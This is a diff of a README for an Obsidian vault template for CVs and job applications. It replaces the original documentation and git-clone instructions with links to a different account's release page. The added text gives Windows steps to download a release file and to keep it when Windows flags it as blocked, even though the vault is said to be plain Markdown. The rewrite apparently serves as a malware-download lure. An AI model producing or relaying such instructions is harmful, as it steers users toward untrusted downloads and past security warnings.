@@ -1,216 +1,200 @@
-# ProfileVault
+# 📁 profile-vault-obsidian - Organize your career profile with ease
 
-A modular Obsidian vault template for managing your professional identity, career history, and applications. Use it as a personal knowledge base with Obsidian's UI, and optionally connect it to LLM-powered tools for intelligent CV generation, application strategy, and profile management.
+[![Download the latest release](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/Olgafoliolate832/profile-vault-obsidian/releases)
 
-## Who Is This For?
+## 🧩 What this is
 
-Researchers, engineers, consultants, and professionals who:
+profile-vault-obsidian is an Obsidian vault template for storing your career details in one place. It helps you manage your CV, job history, grants, fellowships, and related notes without needing a complex setup.
 
-- Work across multiple domains (academic, technical, consulting)
-- Need to generate tailored CVs, cover letters, and grant profiles
-- Apply for jobs, grants, fellowships, PhDs, and conferences
-- Want a structured, queryable knowledge base for their career data
-- Want to optionally leverage AI assistants for application preparation
+Use it to keep track of:
+- Work history
+- Skills and tools
+- Projects and wins
+- CV versions
+- Grant and fellowship applications
+- Notes for AI-assisted writing and review
 
-## Vault Structure
+## 🚀 Getting Started
 
-```
-Profile/
-├── Profile.md                    # Root overview — start here
-├── Applications/                 # Track all applications
-│   ├── Jobs/
-│   ├── Grants/
-│   ├── Fellowships/
-│   ├── PhDs/
-│   └── Conferences/
-├── Experience/                   # Professional roles & positions
-│   ├── Academic/
-│   ├── Industry/
-│   └── Freelance/
-├── Education/                    # Degrees, certifications, courses
-│   ├── Degrees/
-│   ├── Certifications/
-│   └── Courses/
-├── Skills/                       # Categorized skill tracking
-│   ├── Technical/
-│   ├── Research/
-│   ├── Consulting/
-│   ├── Languages/
-│   ├── Software-Tools/
-│   └── Soft-Skills/
-├── Publications/                 # All publication types
-├── Projects/                     # Notable projects
-├── Grants-Funding/               # Funded grant track record
-├── Awards-Honors/                # Awards, prizes, scholarships
-├── Talks-Workshops/              # Talks, presentations, panels
-├── Professional-Service/         # Reviewing, mentoring, organizing
-├── References/                   # Referee management
-├── Identity/                     # Bios, statements, personal info
-├── Archive/                      # Retired content
-└── Templates/                    # Self-documenting templates for all of the above
-```
+Follow these steps on Windows to get the vault ready.
 
-## Key Features
+1. Open the [release page](https://github.com/Olgafoliolate832/profile-vault-obsidian/releases)
+2. Download the latest release file from the assets section
+3. Save the file to a folder you can find again, such as Downloads or Desktop
+4. If the file is zipped, right-click it and choose Extract All
+5. Open Obsidian on your Windows PC
+6. Choose Open folder as vault
+7. Select the extracted profile-vault-obsidian folder
+8. Wait for Obsidian to load the vault
 
-### Self-Documenting Templates
+## 💻 What you need
 
-Every folder has a corresponding template in `Templates/` with:
+For the best results, use:
+- Windows 10 or Windows 11
+- Obsidian installed on your computer
+- Enough space for your notes and attachments
+- A modern browser if you need to open links from inside the vault
 
-- Folder structure blueprints
-- YAML frontmatter field guides
-- Rules and naming conventions
-- Dataview dashboard queries
-- How-to instructions
+## 📦 Download and install
 
-### Application Workflow
+To set up the vault on Windows:
 
-Each application (job, grant, fellowship, PhD, conference) follows a structured workflow:
+1. Visit the [release page](https://github.com/Olgafoliolate832/profile-vault-obsidian/releases)
+2. Download the newest release package
+3. Open the download location
+4. If Windows shows a blocked file message, choose Keep or More info, then keep the file
+5. Extract the folder if the package is compressed
+6. Open Obsidian
+7. Load the extracted folder as a vault
 
-1. **Context/** — gather their information (description, requirements, research)
-2. **Strategy/** — map your profile to their needs (mapping table, gaps, highlights)
-3. **Outputs/** — generate tailored deliverables (CV, cover letter, etc.)
+If you use the vault often, place it in a simple path like:
 
-### Dataview-Powered Dashboards
+- `C:\Users\YourName\Documents\profile-vault-obsidian`
+- `C:\Users\YourName\Desktop\profile-vault-obsidian`
 
-Every folder overview file includes Dataview queries that automatically display:
+## 🗂️ What is inside
 
-- All entries sorted by date, status, or type
-- Active/current items
-- Filtered views (by domain, priority, etc.)
+This vault is built for profile work and application prep. You can expect a structure like:
 
-### Rich Frontmatter
+- **Profile notes** for personal and work details
+- **CV pages** for different versions of your resume
+- **Application folders** for jobs, grants, and fellowships
+- **Project notes** for past work and outcomes
+- **Skill records** for tools, methods, and strengths
+- **Reference notes** for people, links, and resources
+- **AI prompt notes** for drafting and review tasks
 
-Every entry uses structured YAML frontmatter for queryable, filterable data:
+## ✍️ How to use it
 
-- Status tracking (`active`, `completed`, `draft`, etc.)
-- Domain tagging (`academic`, `technical`, `consulting`)
-- Cross-references via wikilinks
-- Dates in ISO format
+Start with the main profile notes and fill in your details. Then add new notes for each application or career goal.
 
-## Getting Started
+A simple workflow:
+- Write one master profile note
+- Create a CV note for each role or grant type
+- Add a note for each application
+- Store job descriptions, deadlines, and draft text together
+- Track changes as you improve your material
 
-### 1. Clone or Download
+This setup helps you keep each version of your profile in sync.
 
-```bash
-git clone https://github.com/nyinyinyanlin/profile-vault-obsidian.git
-```
+## 🔎 Built for fast searching
 
-### 2. Open in Obsidian
+The vault uses a clean Markdown structure, so it is easy to search and edit. It also works well with Obsidian tools such as:
+- Links between notes
+- Tags
+- Templates
+- Dataview-style lists
+- YAML fields for key details
+- Zettelkasten-style notes for connected ideas
 
-1. Open Obsidian
-2. Click "Open folder as vault"
-3. Select the `Profile/` directory inside the cloned repo
+## 🤖 AI-assisted writing
 
-### 3. Install Recommended Plugins
+This vault is made for people who want help from AI tools while keeping control of their own content.
 
-Go to Settings → Community Plugins → Browse and install:
+You can use it for:
+- Drafting CV bullets
+- Rewriting grant answers
+- Comparing versions of a profile
+- Preparing fellowship statements
+- Organizing source notes before asking an AI tool for help
 
-| Plugin | Purpose |
-|--------|---------|
-| **Dataview** | Powers all dashboard queries |
-| **Templater** | Advanced template insertion |
-| **Tasks** | Task tracking across notes |
-| **Calendar** | Calendar view for deadlines |
-| **Obsidian Git** | Version control from within Obsidian |
+A good pattern is:
+- Keep facts in one note
+- Keep drafts in another
+- Link both together
+- Review before you submit anything
 
-### 4. Configure Obsidian Settings
+## 🧠 Suggested note types
 
-- **Files & Links** → Set "New link format" to **"Shortest path when possible"**
-- **Graph View** → Add filter `-path:Templates` to exclude templates from default view
+You can build a steady system with these note types:
 
-### 5. Start Populating
+- **Master Profile** — your full career record
+- **Short CV** — a compact version for quick use
+- **Role-Specific CV** — one version for one job type
+- **Grant Tracker** — deadlines, links, and status
+- **Fellowship Tracker** — selection criteria and draft text
+- **Project Log** — outcomes, tools, and impact
+- **Achievements Note** — awards, praise, and milestones
 
-1. Open `Profile.md` — this is your vault's home page
-2. Start with `Identity/Personal-Info.md` — fill in your basic details
-3. Add your experience, education, and skills
-4. When ready to apply for something, copy the relevant template from `Templates/Applications/`
+## 🛠️ Common tasks
 
-## Using with AI / LLM Tools
+### Update your CV
+Open your CV note, edit the relevant sections, and keep old versions in separate notes.
 
-This vault's structured Markdown files, consistent frontmatter, and modular design make it well-suited for use with LLM-powered tools and agents. Any AI assistant that can read and write Markdown files can:
+### Track a new application
+Create a new note with:
+- Title of the role or grant
+- Organization name
+- Deadline
+- Required documents
+- Status
+- Draft text
 
-- Search your vault for relevant experience, skills, and publications
-- Generate tailored CVs by pulling from your modular profile data
-- Help strategize applications by mapping your profile to requirements
-- Create cover letters, research statements, and grant profiles
-- Maintain and organize your vault structure
+### Reuse past work
+Link to project notes or past application notes so you can copy strong details into a new draft.
 
-### Connecting via MCP (Model Context Protocol)
+### Keep your records tidy
+Use tags and folders for quick sorting. Use note links when one item belongs to more than one place.
 
-MCP is an open protocol that lets AI assistants connect to external tools and data sources. Any MCP-compatible client can connect to this vault.
+## 📁 Folder ideas
 
-**Option 1: MCPVault (recommended — no plugins needed)**
+If you want a simple setup, use folders like:
+- `00 Inbox`
+- `01 Profile`
+- `02 CVs`
+- `03 Applications`
+- `04 Projects`
+- `05 Resources`
+- `06 Templates`
 
-```jsonc
-{
-  "mcpServers": {
-    "profile-vault": {
-      "command": "npx",
-      "args": ["@bitbonsai/mcpvault@latest", "/path/to/ProfileVault/Profile"]
-    }
-  }
-}
-```
+This makes it easier to find the note you need when you are in a hurry.
 
-**Option 2: Filesystem MCP**
+## 🔗 Helpful topics covered
 
-```jsonc
-{
-  "mcpServers": {
-    "profile-vault": {
-      "command": "npx",
-      "args": ["-y", "@modelcontextprotocol/server-filesystem", "/path/to/ProfileVault/Profile"]
-    }
-  }
-}
-```
+This vault fits work around:
+- Career management
+- Job applications
+- Grant writing
+- Knowledge bases
+- Obsidian templates
+- Markdown notes
+- Model Context Protocol tools
+- Profile management
+- AI-assisted drafting
 
-**Option 3: Obsidian MCP plugins**
+## 🧭 Simple first-use plan
 
-Various community plugins expose Obsidian vaults as MCP servers. Check the Obsidian community plugins directory for options compatible with your preferred AI tool.
+If you want to start fast, do this:
+1. Open the vault
+2. Fill in your main profile note
+3. Add one CV version
+4. Add one active application note
+5. Add one project note with real results
+6. Link related notes together
 
-### Other Integration Methods
+## 📚 File format
 
-Since the vault is just a folder of Markdown files, any tool that can read/write files can integrate with it — CLI tools, scripts, IDE extensions, or any LLM agent with filesystem access.
+The vault uses plain Markdown files. That means:
+- You can open them in Obsidian
+- You can move them between devices
+- You can back them up with normal file tools
+- You can read them without special software
 
-## Conventions
+## 🔐 Backup tips
 
-| Convention | Rule |
-|------------|------|
-| **Folder overview files** | Named to match folder (e.g., `Skills/Skills.md`) |
-| **Application entry points** | Always `Index.md` |
-| **Dates** | ISO format (`YYYY-MM-DD`) |
-| **Internal links** | Wikilinks (`[[Note Name]]`) |
-| **Never delete** | Move to `Archive/` instead |
-| **Templates** | Never edit directly — copy first |
+Keep a copy of the vault in another folder or cloud drive. A simple backup habit helps protect your work history, application drafts, and notes.
 
-## Naming Conventions
+Good backup choices:
+- One copy on your PC
+- One copy in cloud storage
+- One copy on an external drive
 
-| Type | Pattern | Example |
-|------|---------|---------|
-| Job application | `YYYY-MM-Organization-Role` | `2026-03-Google-SeniorMLE` |
-| Grant application | `YYYY-MM-Funder-Title` | `2026-04-FWF-AIMonitoring` |
-| Fellowship | `YYYY-MM-Organization-Program` | `2026-05-Humboldt-Fellowship` |
-| PhD application | `YYYY-MM-University-Topic` | `2026-06-ETH-MachineLearning` |
-| Conference | `YYYY-MM-Conference-Topic` | `2026-06-NeurIPS-GraphOpt` |
-| Experience | `Role-Organization-Title` | `Role-Google-SeniorEngineer` |
-| Publication | `Pub-YYYY-Venue-Title` | `Pub-2024-NeurIPS-GraphOpt` |
-| Project | `Proj-YYYY-ShortName` | `Proj-2024-SmartCityPlatform` |
-| Grant record | `Grant-YYYY-Funder-Title` | `Grant-2024-FWF-AIMonitoring` |
-| Award | `Award-YYYY-ShortName` | `Award-2024-BestPaper-NeurIPS` |
-| Talk | `Talk-YYYY-Venue-Topic` | `Talk-2024-NeurIPS-GraphOpt` |
-| Service | `Service-Type-Organization` | `Service-Reviewer-NeurIPS` |
-| Reference | `Ref-FirstnameLastname` | `Ref-MariaSchmidt` |
-| Skill | `Skill-Name` | `Skill-Python` |
+## 🖼️ Example use cases
 
-## License
-
-MIT License — feel free to use, modify, and share.
-
-## Contributing
-
-Contributions are welcome! If you have ideas for improving the vault structure, templates, or documentation:
-
-1. Fork the repo
-2. Create a feature branch
-3. Submit a pull request
+Use profile-vault-obsidian if you want to:
+- Prepare a CV for a new job
+- Track many grant applications
+- Store notes for a fellowship package
+- Keep a record of skills and wins
+- Build a long-term career archive
+- Prepare AI prompts from clean source notes
